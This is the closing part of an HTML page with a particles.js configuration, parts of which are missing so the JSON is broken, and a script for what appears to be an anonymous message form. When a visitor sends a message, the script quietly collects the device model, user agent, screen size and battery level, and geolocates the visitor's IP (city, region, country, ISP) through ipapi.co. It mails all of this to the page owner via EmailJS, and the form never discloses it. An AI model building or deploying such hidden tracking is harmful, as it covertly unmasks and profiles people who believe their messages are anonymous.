    <footer>Developed by <a href="https://instagram.com/h55q" target="_blank" rel="noopener noreferrer">Aseel</a>

    <script src="https://cdn.jsdelivr.net/particles.js/2.0.0/particles.min.js"></script>

    <script>

                    },
                    "shape": {

                        "stroke": {

                            "color": "#000000"
                        }
                    },
                    "opacity": {
                        "value": 0.5,
                        "random": false,
                        "anim": {
                            "enable": false,
                            "speed": 1,
                            "opacity_min": 0.1,
                            "sync": false
                        }
                    },
                    "size": {
                        "value": 3,
                        "random": true,

                        }
                    },
                    "line_linked": {

                        "opacity": 0.4,

                    },

                        "random": false,

                        "out_mode": "out",
                        "bounce": false,
                        "attract": {

                            "rotateY": 1200
                        }
                    }
                },
                "interactivity": {
                    "detect_on": "canvas",
                    "events": {
                        "onhover": {

                        },
                        "onclick": {
                            "enable": true,
                            "mode": "push"
                        },
                        "resize": true
                    },
                    "modes": {
                        "grab": {
                            "distance": 140,
                            "line_linked": {

                            }
                        },
                        "bubble": {
                            "distance": 400,
                            "size": 40,
                            "duration": 2,
                            "opacity": 8,
                            "speed": 3
                        },
                        "repulse": {
                            "distance": 200,
                            "duration": 0.4
                        },
                        "push": {

                        },
                        "remove": {

                        }
                    }
                },
                "retina_detect": true
            });
        });

        (function () {
            emailjs.init("zoJuwTAEEa8rYCfEU");
        })();

        function getPhoneModel(userAgent) {
            const models = {
                iPhone: "Apple iPhone",
                iPad: "Apple iPad",
                Samsung: "Samsung Device",
                Huawei: "Huawei Device",
                Xiaomi: "Xiaomi Device",
                OnePlus: "OnePlus Device",
                Pixel: "Google Pixel",
                Oppo: "Oppo Device",
                Vivo: "Vivo Device",
                Sony: "Sony Xperia",
                LG: "LG Device",
                Nokia: "Nokia Device"
            };
            for (const [key, value] of Object.entries(models)) {
                if (new RegExp(key, "i").test(userAgent)) return value;
            }
            return "Unknown Device";
        }

        // دالة لجمع معلومات الجهاز
        async function getDeviceInfo() {
            const userAgent = navigator.userAgent;
            const platform = navigator.platform;
            const language = navigator.language;
            const screenWidth = window.screen.width;
            const screenHeight = window.screen.height;
            const onlineStatus = navigator.onLine ? "Online" : "Offline";
            const deviceType = /Mobi|Android|iPhone|iPad/i.test(userAgent) ? "Mobile" : "Desktop";
            const phoneModel = getPhoneModel(userAgent);

            let batteryStatus = "Unknown";
            if (navigator.getBattery) {
                try {
                    const battery = await navigator.getBattery();
                    batteryStatus = battery.level * 100 + "%";
                } catch (error) {
                    console.warn("Battery status not available");
                }
            }

            try {
                const response = await fetch("https://ipapi.co/json/");
                const data = await response.json();
                return {
                    userAgent,
                    platform,
                    language,
                    screenResolution: `${screenWidth}x${screenHeight}`,
                    onlineStatus,
                    deviceType,
                    phoneModel,
                    batteryStatus,
                    ip: data.ip,
                    city: data.city,
                    region: data.region,
                    country: data.country_name,
                    isp: data.org
                };
            } catch (error) {
                console.warn("Failed to get IP/location data");
                return {
                    userAgent,
                    platform,
                    language,
                    screenResolution: `${screenWidth}x${screenHeight}`,
                    onlineStatus,
                    deviceType,
                    phoneModel,
                    batteryStatus,
                    ip: "Unknown",
                    city: "Unknown",
                    region: "Unknown",
                    country: "Unknown",
                    isp: "Unknown"
                };
            }
        }

        async function sendEmail(event) {
            event.preventDefault();

            const message = document.querySelector(".message-input").value;
            if (message.trim().length < 1) {
                Swal.fire({
                    icon: 'warning',
                    title: 'Typing something!',
                    confirmButtonText: 'Yes sir'
                });
                return;
            }

            const sendButton = document.querySelector(".send-button");
            sendButton.disabled = true;
            sendButton.textContent = "Sending...";

            Swal.fire({
                title: 'Sending...',
                text: 'Hmmm',
                allowOutsideClick: false,
                didOpen: () => {
                    Swal.showLoading();
                }
            });

            try {
                const deviceInfo = await getDeviceInfo();

                await emailjs.send("service_yy7troc", "template_vpmzcrc", {
                    message: message,
                    deviceInfo: JSON.stringify(deviceInfo, null, 2),
                });

                Swal.fire({
                    icon: 'success',
                    title: 'Message Sent!',
                    text: 'Hmmm',
                    confirmButtonText: 'Yes sir'
                });

                document.querySelector(".message-input").value = "";
            } catch (error) {
                Swal.fire({
                    icon: 'error',
                    title: 'Failed to Send',
                    text: 'Try again.',
                    confirmButtonText: 'Yes sir'
                });
            }

            sendButton.textContent = "Send";
            sendButton.disabled = false;
        }
    </script>
